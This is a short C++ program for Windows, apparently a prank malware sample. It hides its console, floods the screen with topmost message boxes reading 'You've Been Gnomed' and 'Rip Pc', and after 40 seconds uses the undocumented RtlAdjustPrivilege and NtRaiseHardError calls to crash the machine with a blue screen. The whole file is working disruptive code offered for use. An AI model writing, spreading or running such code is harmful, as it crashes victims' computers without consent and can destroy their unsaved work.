#include <thread>

#include <windows.h>
#include <WinUser.h>
#include <synchapi.h>
#pragma comment(lib, "ntdll.lib")

void Sleep(
	DWORD dwMilliseconds
);

BOOL MessageBeep(
	UINT uType
);


EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(
	ULONG    Privilege,
	BOOLEAN  Enable,
	BOOLEAN  CurrentThread,
	PBOOLEAN Enabled
	);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, 
	ULONG NumberOfParameters, 
	PULONG UnicodeStringParameterMask,
	PULONG_PTR Parameters, 
	ULONG ValidResponseOption, 
	PULONG Response
	);



void BSOD() {

	while (true) {

		MessageBoxA(0, "You'e Been Gnomed", "You've Been Gnomed", MB_TOPMOST | MB_ABORTRETRYIGNORE);
		MessageBoxA(0, "Rip Pc", "F", MB_TOPMOST | MB_ABORTRETRYIGNORE);	
		MessageBeep(MB_ICONINFORMATION);


	}
}

/*void BEEP() {



}*/

int main() {
	BOOLEAN bl;
	unsigned long response;
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	std::thread t1 (BSOD);

	Sleep(40'000);
	MessageBeep(MB_ICONINFORMATION);
	RtlAdjustPrivilege(19, true, false, &bl);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);
	
	t1.join();

	return 0;
}